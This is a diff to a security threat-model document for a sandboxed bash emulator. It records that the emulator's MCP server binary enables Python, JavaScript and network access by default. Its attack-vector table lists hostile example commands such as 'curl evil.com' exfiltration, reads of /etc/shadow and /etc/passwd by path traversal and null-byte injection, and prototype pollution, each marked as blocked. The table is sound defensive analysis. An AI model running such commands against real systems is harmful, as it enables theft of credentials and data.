@@ -331,7 +331,7 @@ When `python: true`, CPython 3.13 Emscripten provides full Python execution via 
 - Test modules (`_testcapi`, `_testinternalcapi`, etc.) stripped from binary
 
 **Runtime mitigations**:
-- Disabled by default; must be explicitly enabled via `{ python: true }`
+- Disabled by default; must be explicitly enabled via `{ python: true }`. **Exception**: the standalone `@ag-bash/mcp-server` binary (`packages/mcp-server/src/index.ts`, same constructor as the TB3 network exception above) explicitly sets `runtimes: { python: true, javascript: true }` — every real `npx @ag-bash/mcp-server` install has this opt-in surface active from the start, not as an edge case a consumer chose. All mitigations below still apply; this only changes who is exposed to them by default.
 - 30-second timeout (`maxPythonTimeoutMs`; configurable)
 - Fresh Worker thread per execution (EXIT_RUNTIME; no state leakage between runs)
 - `WorkerDefenseInDepth` with only 2 exclusions: `shared_array_buffer`, `atomics`
@@ -398,10 +398,10 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | 4 | Infinite loop | `while true; do :; done` → maxLoopIterations → throw | **BLOCKED** (limits) |
 | 5 | Prototype pollution | `arr[__proto__]=evil` → Map/null-prototype → no effect | **BLOCKED** (data guards) |
 | 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` → ESM hooks block data:/blob: URLs | **BLOCKED** (Node.js 20.6+; residual on older) |
-| 7 | Network exfiltration | `curl evil.com` → network off → curl not registered | **BLOCKED** (network isolation) |
+| 7 | Network exfiltration | `curl evil.com` → network off → curl not registered (except `@ag-bash/mcp-server`, SSRF-guarded but allow-list-bypassed — see TB3/§3.4) | **BLOCKED** (network isolation) |
 | 8 | process.exit() | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
 | 9 | Brace expansion OOM | `{1..999999999}` → maxBraceExpansionResults → truncated | **BLOCKED** (limits) |
-| 10 | Python escape | Python off by default. If on: worker + defense + virtual FS | **RESIDUAL RISK** (opt-in) |
+| 10 | Python escape | Python off by default (except `@ag-bash/mcp-server`, which opts in for every install — see §4.7). If on: worker + defense + virtual FS | **RESIDUAL RISK** (opt-in) |
 | 11 | ReDoS via user regex | `[[ str =~ evil_pattern ]]` → re2js → linear-time match | **BLOCKED** (re2js) |
 | 12 | Path traversal | `cat ../../etc/shadow` → normalize → `isPathWithinRoot()` → ENOENT | **BLOCKED** (primary FS) |
 | 13 | Null byte injection | `cat "file\x00../../etc/passwd"` → `validatePath()` → rejected | **BLOCKED** (path validation) |
